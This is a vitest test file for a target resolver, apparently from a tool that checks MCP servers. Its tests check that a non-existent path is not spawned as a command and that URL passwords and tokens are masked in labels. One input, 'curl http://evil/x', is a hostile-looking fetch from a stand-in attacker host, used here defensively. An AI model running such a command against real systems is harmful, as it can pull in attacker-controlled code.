import { describe, it, expect } from "vitest";
import { resolveTarget } from "../src/targets/resolve.js";

describe("resolveTarget", () => {
  it("errors on a non-existent --skill/--repo path instead of spawning it as a command", () => {
    expect(() => resolveTarget("no-such-path-xyz", { forceSkill: true })).toThrow(/does not exist/);
    expect(() => resolveTarget("curl http://evil/x", { forceSkill: true })).toThrow(/does not exist/);
    expect(() => resolveTarget("no-such-path-xyz", { forceRepo: true })).toThrow(/does not exist/);
  });

  it("still treats a bare command string as stdio when no path flag is forced", () => {
    expect(resolveTarget("npx -y some-server", {}).kind).toBe("stdio");
  });

  it("forces stdio up front with --stdio", () => {
    expect(resolveTarget("my-server --flag", { forceStdio: true }).kind).toBe("stdio");
  });

  it("honors --skill on an existing path", () => {
    expect(resolveTarget("package.json", { forceSkill: true }).kind).toBe("skillset");
  });

  it("resolves an http(s) URL to an http target", () => {
    expect(resolveTarget("https://example.com/mcp", {}).kind).toBe("http");
  });

  // The label is what the report, an --out file and a diff all print, and it
  // was the input verbatim, so a key passed as `?api_key=` landed in all three.
  it("keeps a URL's password and query values out of the label", () => {
    const url = "https://me:hunter2@mcp.example.com/mcp?token=abc123&region=eu";
    const t = resolveTarget(url, {});
    expect(t).toMatchObject({ kind: "http", url });
    expect(t.label).toBe("https://me:***@mcp.example.com/mcp?token=***&region=***");
  });

  // The label is also how check --diff pairs a server with its baseline, so a
  // URL with nothing to hide must not be normalised into a different string.
  it("leaves a URL with nothing to hide exactly as typed", () => {
    for (const url of ["https://mcp.example.com", "HTTP://Example.com:443/mcp", "https://me@mcp.example.com/mcp#frag"]) {
      expect(resolveTarget(url, {}).label).toBe(url);
    }
  });
});
